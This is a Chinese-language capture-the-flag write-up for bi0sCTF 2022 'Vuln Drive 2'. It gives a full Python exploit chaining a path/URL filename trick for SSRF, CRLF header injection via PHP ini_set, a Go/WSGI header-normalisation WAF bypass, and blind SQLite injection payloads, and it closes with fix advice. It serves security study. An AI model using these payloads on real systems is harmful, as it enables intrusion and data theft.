# bi0sCTF 2022 Vuln Drive 2 Writeup

## 题目简述

Vuln Drive 2 由三个容器组成：公开的 PHP 文件盘、Go 编写的 WAF/反向代理，以及只在内网开放的 Flask 应用。利用链需要先把一个本地上传路径同时塑造成 `http://...@waf` URL，触发 SSRF；再借 PHP `ini_set("from", username)` 的 CRLF 注入控制 SSRF 请求；最后利用 Go 与 WSGI 对特殊和重复请求头的不同归一化绕过 WAF，并通过 SQLite 注入逐位恢复 9 位内部 flag。

最终输出的完整 flag 是固定前缀与内部 9 位十六进制值的拼接。

## 解题过程

### 构造既存在于本地又可被当作 URL 的文件名

登录页不校验凭据，任意 `username` 都会进入 session。文件夹名禁止 `.` 和 `/`，但允许冒号，因此可以创建名为 `http:` 的目录。上传文件名 `asdf.txt@waf` 后，程序只取最后一个点后的内容作为扩展名，实际保存为：

```text
<uniqid>.txt@waf
```

把它与目录名组合，可以得到：

```text
http://<uniqid>.txt@waf
```

对 Linux 本地路径而言，`http://` 中的双斜杠可折叠，文件确实位于当前 session 的 `http:` 目录中，所以 `file_exists` 通过；对 `file_get_contents` 而言，同一字符串又会启用 HTTP wrapper，其中 `<uniqid>.txt` 是 URL userinfo，`waf` 才是主机名。于是 PHP 会向内网 WAF 发起请求。

初始化步骤可以写成：

```python
import re
import requests

BASE = "http://TARGET"
s = requests.Session()
s.post(BASE + "/login.php", data={"username": "guest", "submit": "submit"})
s.get(BASE + "/index.php", params={"new": "http:"})
s.post(
    BASE + "/index.php",
    data={"path": "http:", "submit": "submit"},
    files={"file": ("asdf.txt@waf", b"x")},
)

listing = s.get(BASE + "/view.php", params={"fol": "http:"}).text
href = re.search(r"href='/view\.php\?file=http:/([^']+)'", listing).group(1)
ssrf_url = "http://" + href
```

### 通过 ini_set 注入 SSRF 请求

名称校验失败时会调用：

```php
function report() {
    ini_set("from", $_SESSION['username']);
    file_get_contents("http://localhost/report.php");
}
```

PHP HTTP wrapper 会把 `from` 配置写入 `From` 请求头，并且该配置在当前 PHP 请求余下时间内继续生效。访问 `view.php?fol=.&file=<ssrf_url>` 时，非法的 `fol=.` 先触发 `report()`；随后同一个脚本仍处理 `file` 参数，对 WAF 发起第二次 `file_get_contents`。若 session 中的 username 包含 CRLF，就能从 `From` 值后注入额外请求头、空行和表单正文。

### 利用请求头归一化差异绕过 WAF

WAF 拦截 `X-pro-hacker` 非空、`flag` 包含 `gimme`，以及带危险字符的 `Token`。构造：

```text
hello
Host: localhost
X-pro_hacker: Pro-hacker
Token: GUESS
flag: hello
flag: gimme
Content-Type: application/x-www-form-urlencoded
Content-Length: BODY_LENGTH

BODY
```

两处解析差异使其通过：

- 原始头名 `X-pro_hacker` 含下划线。Go WAF 查询的是 `X-pro-hacker`，不会命中；传到 WSGI 后，两种分隔形式都映射为 `HTTP_X_PRO_HACKER`，Flask 读取 `X-pro-hacker` 时可以看到值。
- 两行同名 `flag` 在 Go 的 `Header.Get` 中只返回第一项 `hello`；到 Flask/WSGI 后重复值被合并，后端看到的字符串包含 `gimme`。

`Token` 只放当前猜测的一个十六进制字符，本身不会触发 WAF 字符过滤。

### 用插入列控制完成盲注

Flask 后端先执行：

```python
q = f"INSERT INTO users values ('{user}','{token}')"
```

再查询：

```python
SELECT * FROM users WHERE token="<GUESS>"
```

令表单正文为：

```text
user=a',substr((select*from flag),POSITION,1));--
```

插入语句就会把 flag 第 `POSITION` 个字符作为新用户的 token。若它等于请求头中猜测的 `GUESS`，随后的 SELECT 命中新行并返回该字符；否则只返回 `INDEX`。

完整枚举核心如下，`Content-Length` 按 UTF-8 正文的实际字节数计算：

```python
alphabet = "0123456789abcdef"
inner = ""

for position in range(1, 10):
    for guess in alphabet:
        body = f"user=a',substr((select*from flag),{position},1));--"
        injected = "\r\n".join([
            "hello",
            "Host: localhost",
            "X-pro_hacker: Pro-hacker",
            f"Token: {guess}",
            "flag: hello",
            "flag: gimme",
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body.encode())}",
            "",
            body,
        ])

        s.post(
            BASE + "/login.php",
            data={"username": injected, "submit": "submit"},
        )
        page = s.get(
            BASE + "/view.php",
            params={"fol": ".", "file": ssrf_url},
        ).text

        leaked = re.search(r"not found</div>(.)", page, re.S)
        if leaked and leaked.group(1) == guess:
            inner += guess
            break

print("bi0sCTF{" + inner + "}")
```

恢复结果为：

```text
bi0sCTF{dfae5409d}
```

官方赛后文章包含同一条 SSRF、请求头差异和 SQLite 插入列盲注链，可与三个容器的源码逐项对照：[Vuln Drive 2 官方题解](https://blog.bi0s.in/2023/01/24/Web/Vuln-Drive2-bi0sCTF222023/)。

## 方法总结

本题的核心不是某一个独立 payload，而是让同一字符串在不同解释器中呈现不同语义：本地路径与 HTTP URL、PHP `From` 配置与原始请求头、Go Header 与 WSGI environ、SQL 用户名与插入值。逐层记录“谁在解析、如何规范化”比盲猜绕过字符更可靠。

修复应禁止 URL wrapper 读取用户可控路径，避免用 session 数据设置 HTTP 配置，拒绝请求头中的 CRLF 和下划线歧义，并对 SQL 使用参数化查询。WAF 与后端还应共享相同的规范化规则，尤其不能依赖重复头的第一项来作安全判断。
